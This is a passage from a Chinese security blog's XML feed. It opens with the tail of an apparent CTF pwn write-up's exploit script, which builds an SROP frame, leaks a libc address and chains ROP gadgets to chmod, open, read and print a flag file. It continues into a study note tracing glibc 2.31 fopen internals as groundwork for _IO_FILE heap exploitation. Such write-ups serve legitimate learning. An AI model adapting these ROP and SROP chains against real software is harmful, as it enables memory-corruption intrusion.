class="line">payload=p64(<span class="number">0x404460</span>)+p64(syscall_ret)+p64(<span class="number">0x404460</span>)+p64(syscall_ret)+<span class="built_in">bytes</span>(sigframe)+<span class="string">b&#x27;flag\0&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">3</span>+<span class="string">b&#x27;chall\0&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404460</span>)+p64(<span class="number">0x4013D4</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2a</span>+p64(<span class="number">0x404060</span>)+p64(lr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">s(payload)</span><br><span class="line">r()</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">s(<span class="string">b&#x27;f&#x27;</span>*<span class="number">0xf</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">libc.address=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x404800</span>)+p64(pop_rdi_ret+libc.address)+p64(flag)+p64(pop_rsi_ret+libc.address)+p64(<span class="number">0o777</span>)+p64(pop_rax_ret+libc.address)+p64(<span class="number">0x5a</span>)+p64(syscall+libc.address)</span><br><span class="line">payload+=p64(pop_rdi_ret+libc.address)+p64(flag)+p64(pop_rsi_ret+libc.address)+p64(<span class="number">4</span>)+p64(pop_rax_ret+libc.address)+p64(<span class="number">2</span>)+p64(syscall+libc.address)</span><br><span class="line">payload+=p64(pop_rdi_ret+libc.address)+p64(<span class="number">3</span>)+p64(pop_rsi_ret+libc.address)+p64(<span class="number">0x404a00</span>)+p64(pop_rdx_ret+libc.address)+p64(<span class="number">64</span>)+p64(pop_rax_ret+libc.address)+p64(<span class="number">0</span>)+p64(syscall+libc.address)</span><br><span class="line">payload+=p64(pop_rdi_ret+libc.address)+p64(<span class="number">1</span>)+p64(pop_rsi_ret+libc.address)+p64(<span class="number">0x404a00</span>)+p64(pop_rdx_ret+libc.address)+p64(<span class="number">0x40</span>)+p64(pop_rax_ret+libc.address)+p64(<span class="number">1</span>)+p64(syscall+libc.address)</span><br><span class="line">s(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">r()</span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2a</span>+p64(<span class="number">0x404060</span>)+p64(lr))</span><br><span class="line"></span><br><span class="line">irt()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> 学习记录 </tag>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>file函数学习</title>
      <link href="/posts/33400/"/>
      <url>/posts/33400/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学堆中_IO_FILE的利用,也就是各种how2heap了</p><p>发现对_IO_FILE的具体规则及代码运用其实还不是很熟悉</p><p>恰好发现了rap-cp和桑榆两个大佬的博客文章</p><p>认真学习了一番</p><p>并记录自己的学习收获</p><p>glibc使用2.31,因为自己的ubuntu默认libc是2.31的,比较方便</p><p>版本差异导致有些代码并不能完全对应,不过问题不大</p><hr><p>很多函数的原型不太好找是因为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_proto(name, attrs...)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_tls_proto(name, attrs...)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_def(name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_weak(name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_ver(local, name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_data_def(name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_tls_def(name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_data_weak(name)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> libc_hidden_data_ver(local, name)</span></span><br><span class="line"></span><br><span class="line">versioned_symbol (libc, _IO_new_do_write, _IO_do_write, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_attach, _IO_file_attach, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_close_it, _IO_file_close_it, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_finish, _IO_file_finish, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_fopen, _IO_file_fopen, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_init, _IO_file_init, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_setbuf, _IO_file_setbuf, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_sync, _IO_file_sync, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_overflow, _IO_file_overflow, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_seekoff, _IO_file_seekoff, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_underflow, _IO_file_underflow, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_write, _IO_file_write, GLIBC_2_1);</span><br><span class="line">versioned_symbol (libc, _IO_new_file_xsputn, _IO_file_xsputn, GLIBC_2_1);</span><br></pre></td></tr></table></figure><p>等一系列原型隐藏符号映射宏</p><h1 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h1><p>fopen实际上是 _IO_new_fopen函数，该函数在/libio/iofopen.c文件中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到_IO_new_fopen仅仅是调用了__fopen_internal</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__fopen_internal其实就差不多已经包含了整个流程了</p><p>整个<code>__fopen_internal</code>函数包含四个部分：</p><ol><li><code>malloc</code>分配内存空间。</li><li><code>_IO_no_init</code> 对file结构体进行<code>null</code>初始化。</li><li><code>_IO_file_init</code>将结构体链接进<code>_IO_list_all</code>链表。</li><li><code>_IO_file_fopen</code>执行系统调用打开文件。</li></ol><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>开头声明了一个结构体并实例化了一个对象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));</span><br></pre></td></tr></table></figure><p>在64位系统中大小为0x230</p><p>该结构体包含三个结构体<code>_IO_FILE_plus</code>、<code>_IO_lock_t</code>、<code>_IO_wide_data</code>，其中<code>_IO_FILE_plus</code>为使用的<code>IO FILE</code>的结构体。</p><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p><strong>_IO_no_init 对file结构体进行null初始化</strong></p><p>在分配完空间后，接着就调用<code>_IO_no_init</code>函数去null初始化结构体，跟进去该函数，函数在<code>/libio/genops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_no_init (FILE *fp, <span class="type">int</span> flags, <span class="type">int</span> orientation,</span><br><span class="line">     <span class="keyword">struct</span> _IO_wide_data *wd, <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *jmp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_old_init (fp, flags);</span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data = wd;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">       stream.  */</span></span><br><span class="line">    fp-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line">  fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_old_init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_old_init (FILE *fp, <span class="type">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|flags;</span><br><span class="line">  fp-&gt;_flags2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (stdio_needs_locking)</span><br><span class="line">    fp-&gt;_flags2 |= _IO_FLAGS2_NEED_LOCK;</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_chain = <span class="literal">NULL</span>; <span class="comment">/* Not necessary. */</span></span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_markers = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_cur_column = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">  fp-&gt;_vtable_offset = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_init (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据参数初始化_IO_wide_data与_IO_FILE_plus,多数置为NULL</p><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><p><strong>_IO_file_init将结构体链接进_IO_list_all</strong></p><p>在执行完<code>_IO_no_init</code>函数后，回到<code>__fopen_internal</code>函数，</p><p>函数将<code>_IO_FILE_plus</code>结构体的vtable设置成了<code>_IO_file_jumps</code>，</p><p>然后调用<code>_IO_file_init_internal</code>将<code>_IO_FILE_plus</code>结构体链接进入<code>_IO_list_all</code>链表，跟进去函数，函数在<code>/libio/fileops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init_internal (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的主体就是调用了<code>_IO_link_in</code>函数，跟进去，函数在<code>/libio/genops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;file._chain = (FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_link_in</code>函数的功能是检查FILE结构体是否包含<code>_IO_LINKED</code>标志，如果不包含则表示这个结构体没有链接进入<code>_IO_list_all</code>，则再后面把它链接进入<code>_IO_list_all</code>链表，同时设置FILE结构体的<code>_chain</code>字段为之前的链表的值，否则直接返回。</p><p>所以<code>_IO_file_init</code>主要功能是将FILE结构体链接进入<code>_IO_list_all</code>链表，在没执行<code>_IO_file_init</code>函数前<code>_IO_list_all</code>指向的是<code>stderr</code>结构体</p><h2 id="0x4-IO-new-file-fopen"><a href="#0x4-IO-new-file-fopen" class="headerlink" title="0x4_IO_new_file_fopen"></a>0x4_IO_new_file_fopen</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_file_fopen ((FILE *) new_f, filename, mode, is32)</span><br></pre></td></tr></table></figure><p>注意：上面的函数调用过程中将 new_f 指针从 locked_FILE 转为了 FILE，这样做是合法的，因为 locked_FILE 中第一个变量_IO_FILE_plus 的首个变量即是 FILE，实际上这样做使得 new_f 指针的访问被截断，只能访问前面 FILE 中的内容。</p><p>这里做了符号映射，实际调用_IO_file_fopen 被映射为_IO_new_file_fopen</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">versioned_symbol (libc, _IO_new_file_fopen, _IO_file_fopen, GLIBC_2_1);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_file_fopen (FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode,</span><br><span class="line">    <span class="type">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line">  <span class="type">int</span> read_write;</span><br><span class="line">  <span class="type">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  FILE *result;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *cs;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *last_recognized;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))<span class="comment">//如果文件已经打开</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> (*mode)<span class="comment">//参数选项不为空</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">      omode = O_RDONLY;</span><br><span class="line">      read_write = _IO_NO_WRITES;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_TRUNC;</span><br><span class="line">      read_write = _IO_NO_READS;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_APPEND;</span><br><span class="line">      read_write = _IO_NO_READS|_IO_IS_APPENDING;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  last_recognized = mode;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> (*++mode)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">  omode = O_RDWR;</span><br><span class="line">  read_write &amp;= _IO_IS_APPENDING;</span><br><span class="line">  last_recognized = mode;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">  oflags |= O_EXCL;</span><br><span class="line">  last_recognized = mode;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span 